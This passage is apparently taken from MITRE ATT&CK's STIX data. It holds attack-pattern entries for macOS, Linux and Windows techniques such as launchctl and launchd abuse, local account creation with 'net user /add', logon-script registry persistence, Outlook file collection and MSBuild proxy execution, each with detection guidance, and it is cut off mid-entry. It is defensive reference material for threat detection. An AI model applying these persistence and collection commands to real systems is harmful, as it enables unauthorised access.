    "{\"created\":\"2017-12-14T16:46:06.044Z\",\"external_references\":[{\"external_id\":\"T1152\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1152\"},{\"description\":\"Dani Creus, Tyler Halfpop, Robert Falcone. (2016, September 26). Sofacy\'s \'Komplex\' OS X Trojan. Retrieved July 8, 2017.\",\"source_name\":\"Sofacy Komplex Trojan\",\"url\":\"https://researchcenter.paloaltonetworks.com/2016/09/unit42-sofacys-komplex-os-x-trojan/\"}],\"id\":\"attack-pattern--53bfc8bf-8f76-4cd7-8958-49a884ddb3ee\",\"modified\":\"2020-03-10T18:31:00.336Z\",\"name\":\"Launchctl\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-03-10T18:26:56.187Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may abuse launchctl to execute commands or programs. Launchctl controls the macOS launchd process, which handles things like [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s and [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s, but can execute other commands or programs itself. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input.(Citation: Launchctl Man)\\n\\nBy loading or reloading [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s, adversaries can install persistence or execute changes they made.(Citation: Sofacy Komplex Trojan)\\n\\nRunning a command from launchctl is as simple as <code>launchctl submit -l <labelName> -- /Path/to/thing/to/execute \\\"arg\\\" \\\"arg\\\" \\\"arg\\\"</code>. Adversaries can abuse this functionality to execute code or even bypass application control if launchctl is an allowed process.\",\"external_references\":[{\"external_id\":\"T1569.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1569/001\"},{\"description\":\"SS64. (n.d.). launchctl. Retrieved March 28, 2020.\",\"source_name\":\"Launchctl Man\",\"url\":\"https://ss64.com/osx/launchctl.html\"},{\"description\":\"Dani Creus, Tyler Halfpop, Robert Falcone. (2016, September 26). Sofacy\'s \'Komplex\' OS X Trojan. Retrieved July 8, 2017.\",\"source_name\":\"Sofacy Komplex Trojan\",\"url\":\"https://researchcenter.paloaltonetworks.com/2016/09/unit42-sofacys-komplex-os-x-trojan/\"}],\"id\":\"attack-pattern--810aa4ad-61c9-49cb-993f-daa06199421d\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"execution\"}],\"modified\":\"2020-06-08T23:28:29.079Z\",\"name\":\"Launchctl\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process command-line parameters\",\"Process monitoring\",\"File monitoring\"],\"x_mitre_detection\":\"KnockKnock can be used to detect persistent programs such as those installed via launchctl as launch agents or launch daemons. Additionally, every launch agent or launch daemon must have a corresponding plist file on disk which can be monitored. Monitor process execution from launchctl/launchd for unusual or unknown processes.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\",\"root\"],\"x_mitre_platforms\":[\"macOS\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2019-12-03T14:15:27.452Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may abuse the <code>Launchd</code> daemon to perform task scheduling for initial or recurring execution of malicious code. The <code>launchd</code> daemon, native to macOS, is responsible for loading and maintaining services within the operating system. This process loads the parameters for each launch-on-demand system-level daemon from the property list (plist) files found in <code>/System/Library/LaunchDaemons</code> and <code>/Library/LaunchDaemons</code> (Citation: AppleDocs Launch Agent Daemons). These LaunchDaemons have property list files which point to the executables that will be launched (Citation: Methods of Mac Malware Persistence).\\n\\nAn adversary may use the <code>launchd</code> daemon in macOS environments to schedule new executables to run at system startup or on a scheduled basis for persistence. <code>launchd</code> can also be abused to run a process under the context of a specified account. Daemons, such as <code>launchd</code>, run with the permissions of the root user account, and will operate regardless of which user account is logged in.\",\"external_references\":[{\"external_id\":\"T1053.004\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1053/004\"},{\"description\":\"Apple. (n.d.). Creating Launch Daemons and Agents. Retrieved July 10, 2017.\",\"source_name\":\"AppleDocs Launch Agent Daemons\",\"url\":\"https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html\"},{\"description\":\"Patrick Wardle. (2014, September). Methods of Malware Persistence on Mac OS X. Retrieved July 5, 2017.\",\"source_name\":\"Methods of Mac Malware Persistence\",\"url\":\"https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf\"}],\"id\":\"attack-pattern--8faedf87-dceb-4c35-b2a2-7286f59a3bc3\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"execution\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"}],\"modified\":\"2020-03-23T22:41:14.739Z\",\"name\":\"Launchd\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process command-line parameters\",\"File monitoring\",\"Process monitoring\"],\"x_mitre_detection\":\"Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Look for changes to tasks that do not correlate with known software, patch cycles, etc. \\n\\nSuspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"root\"],\"x_mitre_platforms\":[\"macOS\"],\"x_mitre_remote_support\":false,\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-04T19:24:27.774Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\\n\\nMost Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform’s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: <code>chown</code> (short for change owner), and <code>chmod</code> (short for change mode).\\n\\nAdversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [.bash_profile and .bashrc](https://attack.mitre.org/techniques/T1546/004) or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).\",\"external_references\":[{\"external_id\":\"T1222.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1222/002\"},{\"description\":\"Hybrid Analysis. (2018, June 12). c9b65b764985dfd7a11d3faf599c56b8.exe. Retrieved August 19, 2018.\",\"source_name\":\"Hybrid Analysis Icacls1 June 2018\",\"url\":\"https://www.hybrid-analysis.com/sample/ef0d2628823e8e0a0de3b08b8eacaf41cf284c086a948bdfd67f4e4373c14e4d?environmentId=100\"},{\"description\":\"Hybrid Analysis. (2018, May 30). 2a8efbfadd798f6111340f7c1c956bee.dll. Retrieved August 19, 2018.\",\"source_name\":\"Hybrid Analysis Icacls2 May 2018\",\"url\":\"https://www.hybrid-analysis.com/sample/22dab012c3e20e3d9291bce14a2bfc448036d3b966c6e78167f4626f5f9e38d6?environmentId=110\"}],\"id\":\"attack-pattern--09b130a2-a77e-4af0-a361-f46f9aad1345\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-03-29T23:12:40.041Z\",\"name\":\"Linux and Mac File and Directory Permissions Modification\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process command-line parameters\",\"Process monitoring\",\"File monitoring\"],\"x_mitre_detection\":\"Monitor and investigate attempts to modify ACLs and file/directory ownership. Many of the commands used to modify ACLs and file/directory ownership are built-in system utilities and may generate a high false positive alert rate, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible.\\n\\nConsider enabling file/directory permission change auditing on folders containing key binary/configuration files.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\",\"root\"],\"x_mitre_platforms\":[\"macOS\",\"Linux\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-01-28T13:50:22.506Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. With a sufficient level of access, the <code>net user /add</code> command can be used to create a local account.\\n\\nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.\",\"external_references\":[{\"external_id\":\"T1136.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1136/001\"},{\"description\":\"Lich, B., Miroshnikov, A. (2017, April 5). 4720(S): A user account was created. Retrieved June 30, 2017.\",\"source_name\":\"Microsoft User Creation Event\",\"url\":\"https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4720\"}],\"id\":\"attack-pattern--635cbe30-392d-4e27-978e-66774357c762\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"}],\"modified\":\"2020-03-23T18:04:20.780Z\",\"name\":\"Local Account\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process monitoring\",\"Process command-line parameters\",\"Authentication logs\",\"Windows event logs\"],\"x_mitre_detection\":\"Monitor for processes and command-line parameters associated with local account creation, such as <code>net user /add</code> or <code>useradd</code>. Collect data on account creation within a network. Event ID 4720 is generated when a user account is created on a Windows system. (Citation: Microsoft User Creation Event) Perform regular audits of local system accounts to detect suspicious accounts that may have been created by an adversary.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-21T21:07:55.393Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may attempt to get a listing of local system accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior.\\n\\nCommands such as <code>net user</code> and <code>net localgroup</code> of the [Net](https://attack.mitre.org/software/S0039) utility and <code>id</code> and <code>groups</code>on macOS and Linux can list local users and groups. On Linux, local users can also be enumerated through the use of the <code>/etc/passwd</code> file.\",\"external_references\":[{\"external_id\":\"T1087.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1087/001\"}],\"id\":\"attack-pattern--25659dd6-ea12-45c4-97e6-381e3e4b593e\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"discovery\"}],\"modified\":\"2020-03-20T19:39:59.544Z\",\"name\":\"Local Account\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"API monitoring\",\"Process monitoring\",\"Process command-line parameters\"],\"x_mitre_detection\":\"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\\n\\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-03-13T20:26:46.695Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.\\n\\nLocal Accounts may also be abused to elevate privileges and harvest credentials through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement. \",\"external_references\":[{\"external_id\":\"T1078.003\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1078/003\"}],\"id\":\"attack-pattern--fdc47f44-dd32-4b99-af5f-209f556f63c2\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"initial-access\"}],\"modified\":\"2020-03-23T21:48:41.083Z\",\"name\":\"Local Accounts\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Authentication logs\"],\"x_mitre_detection\":\"Perform regular audits of local system accounts to detect accounts that may have been created by an adversary for persistence. Look for suspicious account behavior, such as accounts logged in at odd times or outside of business hours.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\",\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-03-13T21:13:10.467Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.\",\"external_references\":[{\"external_id\":\"T1074.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1074/001\"}],\"id\":\"attack-pattern--1c34f7aa-9341-4a48-bfab-af22e51aca6c\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"collection\"}],\"modified\":\"2020-05-26T19:23:54.854Z\",\"name\":\"Local Data Staging\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process command-line parameters\",\"Process monitoring\",\"File monitoring\"],\"x_mitre_detection\":\"Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files, such as 7zip, RAR, ZIP, or zlib. Monitor publicly writeable directories, central locations, and commonly used staging directories (recycle bin, temp folders, etc.) to regularly check for compressed or encrypted data that may be indicative of staging.\\n\\nMonitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-19T18:46:06.098Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may target user email on local systems to collect sensitive information. Files containing email data can be acquired from a user’s local system, such as Outlook storage or cache files.\\n\\nOutlook stores data locally in offline data files with an extension of .ost. Outlook 2010 and later supports .ost file sizes up to 50GB, while earlier versions of Outlook support up to 20GB.(Citation: Outlook File Sizes) IMAP accounts in Outlook 2013 (and earlier) and POP accounts use Outlook Data Files (.pst) as opposed to .ost, whereas IMAP accounts in Outlook 2016 (and later) use .ost files. Both types of Outlook data files are typically stored in `C:\\\\Users\\\\<username>\\\\Documents\\\\Outlook Files` or `C:\\\\Users\\\\<username>\\\\AppData\\\\Local\\\\Microsoft\\\\Outlook`.(Citation: Microsoft Outlook Files)\",\"external_references\":[{\"external_id\":\"T1114.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1114/001\"},{\"description\":\"N. O\'Bryan. (2018, May 30). Managing Outlook Cached Mode and OST File Sizes. Retrieved February 19, 2020.\",\"source_name\":\"Outlook File Sizes\",\"url\":\"https://practical365.com/clients/office-365-proplus/outlook-cached-mode-ost-file-sizes/\"},{\"description\":\"Microsoft. (n.d.). Introduction to Outlook Data Files (.pst and .ost). Retrieved February 19, 2020.\",\"source_name\":\"Microsoft Outlook Files\",\"url\":\"https://support.office.com/en-us/article/introduction-to-outlook-data-files-pst-and-ost-222eaf92-a995-45d9-bde2-f331f60e2790\"}],\"id\":\"attack-pattern--1e9eb839-294b-48cc-b0d3-c45555a2a004\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"collection\"}],\"modified\":\"2020-03-24T17:59:20.983Z\",\"name\":\"Local Email Collection\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process monitoring\",\"File monitoring\",\"Authentication logs\",\"Mail server\"],\"x_mitre_detection\":\"Monitor processes and command-line arguments for actions that could be taken to gather local email files. Monitor for unusual processes accessing local email files. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-03-12T19:29:21.013Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.\\n\\nCommands such as <code>net localgroup</code> of the [Net](https://attack.mitre.org/software/S0039) utility, <code>dscl . -list /Groups</code> on macOS, and <code>groups</code> on Linux can list local groups.\",\"external_references\":[{\"external_id\":\"T1069.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1069/001\"}],\"id\":\"attack-pattern--a01bf75f-00b2-4568-a58f-565ff9bf202b\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"discovery\"}],\"modified\":\"2020-03-26T17:48:27.871Z\",\"name\":\"Local Groups\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"API monitoring\",\"Process monitoring\",\"Process command-line parameters\"],\"x_mitre_detection\":\"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\\n\\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-12-14T16:46:06.044Z\",\"external_references\":[{\"external_id\":\"T1168\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1168\"},{\"description\":\"Paul Vixie. (n.d.). crontab(5) - Linux man page. Retrieved December 19, 2017.\",\"source_name\":\"Die.net Linux crontab Man Page\",\"url\":\"https://linux.die.net/man/5/crontab\"},{\"description\":\"Thomas Koenig. (n.d.). at(1) - Linux man page. Retrieved December 19, 2017.\",\"source_name\":\"Die.net Linux at Man Page\",\"url\":\"https://linux.die.net/man/1/at\"},{\"description\":\"Apple. (n.d.). Retrieved July 17, 2017.\",\"source_name\":\"AppleDocs Scheduling Timed Jobs\",\"url\":\"https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/ScheduledJobs.html\"},{\"description\":\"Thomas. (2013, July 15). New signed malware called Janicab. Retrieved July 17, 2017.\",\"source_name\":\"Janicab\",\"url\":\"http://www.thesafemac.com/new-signed-malware-called-janicab/\"},{\"description\":\"Patrick Wardle. (2014, September). Methods of Malware Persistence on Mac OS X. Retrieved July 5, 2017.\",\"source_name\":\"Methods of Mac Malware Persistence\",\"url\":\"https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf\"},{\"description\":\"Patrick Wardle. (2015). Malware Persistence on OS X Yosemite. Retrieved July 10, 2017.\",\"source_name\":\"Malware Persistence on OS X\",\"url\":\"https://www.rsaconference.com/writable/presentations/file_upload/ht-r03-malware-persistence-on-os-x-yosemite_final.pdf\"},{\"description\":\"Threat Intelligence Team. (2015, January 6). Linux DDoS Trojan hiding itself with an embedded rootkit. Retrieved January 8, 2018.\",\"source_name\":\"Avast Linux Trojan Cron Persistence\",\"url\":\"https://blog.avast.com/2015/01/06/linux-ddos-trojan-hiding-itself-with-an-embedded-rootkit/\"}],\"id\":\"attack-pattern--c0a384a4-9a25-40e1-97b6-458388474bc8\",\"modified\":\"2020-03-19T18:17:25.706Z\",\"name\":\"Local Job Scheduling\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2017-12-14T16:46:06.044Z\",\"external_references\":[{\"external_id\":\"T1162\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1162\"},{\"external_id\":\"CAPEC-564\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/564.html\"},{\"description\":\"Apple. (2016, September 13). Adding Login Items. Retrieved July 11, 2017.\",\"source_name\":\"Adding Login Items\",\"url\":\"https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLoginItems.html\"},{\"description\":\"Patrick Wardle. (2014, September). Methods of Malware Persistence on Mac OS X. Retrieved July 5, 2017.\",\"source_name\":\"Methods of Mac Malware Persistence\",\"url\":\"https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf\"},{\"description\":\"Patrick Wardle. (2015). Malware Persistence on OS X Yosemite. Retrieved July 10, 2017.\",\"source_name\":\"Malware Persistence on OS X\",\"url\":\"https://www.rsaconference.com/writable/presentations/file_upload/ht-r03-malware-persistence-on-os-x-yosemite_final.pdf\"},{\"description\":\"Thomas Reed. (2017, July 7). New OSX.Dok malware intercepts web traffic. Retrieved July 10, 2017.\",\"source_name\":\"OSX.Dok Malware\",\"url\":\"https://blog.malwarebytes.com/threat-analysis/2017/04/new-osx-dok-malware-intercepts-web-traffic/\"}],\"id\":\"attack-pattern--36675cd3-fe00-454c-8516-aebecacbe9d9\",\"modified\":\"2020-03-19T19:17:58.513Z\",\"name\":\"Login Item\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-01-10T16:01:15.995Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use macOS logon scripts automatically executed at logon initialization to establish persistence. macOS allows logon scripts (known as login hooks) to be executed whenever a specific user logs into a system. A login hook tells Mac OS X to execute a certain script when a user logs in, but unlike [Startup Items](https://attack.mitre.org/techniques/T1037/005), a login hook executes as the elevated root user.(Citation: creating login hook)\\n\\nAdversaries may use these login hooks to maintain persistence on a single system.(Citation: S1 macOs Persistence) Access to login hook scripts may allow an adversary to insert additional malicious code. There can only be one login hook at a time though and depending on the access configuration of the hooks, either local credentials or an administrator account may be necessary. \",\"external_references\":[{\"external_id\":\"T1037.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1037/002\"},{\"description\":\"Apple. (2011, June 1). Mac OS X: Creating a login hook. Retrieved July 17, 2017.\",\"source_name\":\"creating login hook\",\"url\":\"https://support.apple.com/de-at/HT2420\"},{\"description\":\"Stokes, P. (2019, July 17). How Malware Persists on macOS. Retrieved March 27, 2020.\",\"source_name\":\"S1 macOs Persistence\",\"url\":\"https://www.sentinelone.com/blog/how-malware-persists-on-macos/\"}],\"id\":\"attack-pattern--43ba2b05-cf72-4b6c-8243-03a4aba41ee0\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"}],\"modified\":\"2020-03-27T16:49:15.786Z\",\"name\":\"Logon Script (Mac)\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process monitoring\",\"File monitoring\"],\"x_mitre_detection\":\"Monitor logon scripts for unusual access by abnormal users or at abnormal times. Look for files added or modified by unusual accounts outside of normal administration duties. Monitor running process for actions that could be indicative of abnormal programs or executables running upon logon.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"macOS\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-01-10T03:43:37.211Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use Windows logon scripts automatically executed at logon initialization to establish persistence. Windows allows logon scripts to be run whenever a specific user or group of users log into a system.(Citation: TechNet Logon Scripts) This is done via adding a path to a script to the <code>HKCU\\\\Environment\\\\UserInitMprLogonScript</code> Registry key.(Citation: Hexacorn Logon Scripts)\\n\\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. \",\"external_references\":[{\"external_id\":\"T1037.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1037/001\"},{\"description\":\"Microsoft. (2005, January 21). Creating logon scripts. Retrieved April 27, 2016.\",\"source_name\":\"TechNet Logon Scripts\",\"url\":\"https://technet.microsoft.com/en-us/library/cc758918(v=ws.10).aspx\"},{\"description\":\"Hexacorn. (2014, November 14). Beyond good ol’ Run key, Part 18. Retrieved November 15, 2019.\",\"source_name\":\"Hexacorn Logon Scripts\",\"url\":\"http://www.hexacorn.com/blog/2014/11/14/beyond-good-ol-run-key-part-18/\"}],\"id\":\"attack-pattern--eb125d40-0b2d-41ac-a71a-3229241c2cd3\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"}],\"modified\":\"2020-03-24T23:45:03.153Z\",\"name\":\"Logon Script (Windows)\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process monitoring\",\"Windows Registry\"],\"x_mitre_detection\":\"Monitor for changes to Registry values associated with Windows logon scrips, nameley <code>HKCU\\\\Environment\\\\UserInitMprLogonScript</code>.\\n\\nMonitor running process for actions that could be indicative of abnormal programs or executables running upon logon.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-03-27T21:50:26.042Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use MSBuild to proxy execution of code through a trusted Windows utility. MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It handles XML formatted project files that define requirements for loading and building various platforms and configurations.(Citation: MSDN MSBuild)\\n\\nAdversaries can abuse MSBuild to proxy execution of malicious code. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# code to be inserted into an XML project file.(Citation: MSDN MSBuild) MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application control defenses that are configured to allow MSBuild.exe execution.(Citation: LOLBAS Msbuild)\",\"external_references\":[{\"external_id\":\"T1127.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1127/001\"},{\"description\":\"Microsoft. (n.d.). MSBuild1. Retrieved November 30, 2016.\",\"source_name\":\"MSDN MSBuild\",\"url\":\"https://msdn.microsoft.com/library/dd393574.aspx\"},{\"description\":\"LOLBAS. (n.d.). Msbuild.exe. Retrieved July 31, 